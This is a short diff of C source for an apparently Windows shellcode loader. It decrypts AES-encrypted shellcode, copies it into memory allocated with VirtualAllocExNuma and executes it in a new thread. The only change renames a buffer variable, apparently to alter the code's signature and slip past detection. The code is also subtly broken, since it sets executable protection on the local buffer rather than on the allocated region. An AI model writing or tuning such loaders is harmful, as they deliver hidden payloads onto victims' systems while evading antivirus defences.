@@ -47,22 +47,22 @@ int main() {
 
     // Print the AES key and shellcode for debugging (as hex)
      unsigned char keykum[AESkeyLen];
-    unsigned char codkuma[AESCodeLen];
+    unsigned char codu[AESCodeLen];
 
     // Copy the data into the arrays
     memcpy(keykum, AESkey, AESkeyLen);
-    memcpy(codkuma, AESCode, AESCodeLen);
+    memcpy(codu, AESCode, AESCodeLen);
 
     // Print the AES key and shellcode for debugging (as hex)
     
 
     LPVOID coollo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
 
-    DECaes((char*)codkuma, sizeof(codkuma), keykum, sizeof(keykum));  // Decrypt AES shellcode
+    DECaes((char*)codu, sizeof(codu), keykum, sizeof(keykum));  // Decrypt AES shellcode
 
-    memcpy(coollo, codkuma, sizeof(codkuma));  
+    memcpy(coollo, codu, sizeof(codu));  
     DWORD oldProtect;
-    VirtualProtect(codkuma, sizeof(codkuma), PAGE_EXECUTE_READ, &oldProtect);  
+    VirtualProtect(codu, sizeof(codu), PAGE_EXECUTE_READ, &oldProtect);  
 
     HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)coollo, NULL, 0, NULL);  
     WaitForSingleObject(tHandle, INFINITE);  // Wait for thread to finish
